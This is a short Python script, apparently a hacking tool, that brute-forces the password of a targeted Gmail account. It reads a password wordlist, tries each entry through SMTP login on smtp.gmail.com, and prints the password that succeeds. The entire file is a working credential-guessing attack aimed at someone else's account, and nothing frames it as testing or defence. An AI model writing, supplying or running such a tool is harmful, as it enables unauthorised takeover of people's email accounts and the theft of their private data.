import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()

user = input(colored("Enter Targets Email Address: ","yellow"))
passwdfile = input(colored("Enter the path to pswd File: ","yellow"))
file = open(passwdfile, "r")

for password in file:
    password = password.strip('\n')
    try:
        smtpserver.login(user, password)
        print(colored("password Found %s "% password,"green"))
        break
    except smtplib.SMTPAuthenticationError:
        print(colored("Wrong Password: %s" %password,"magenta"))
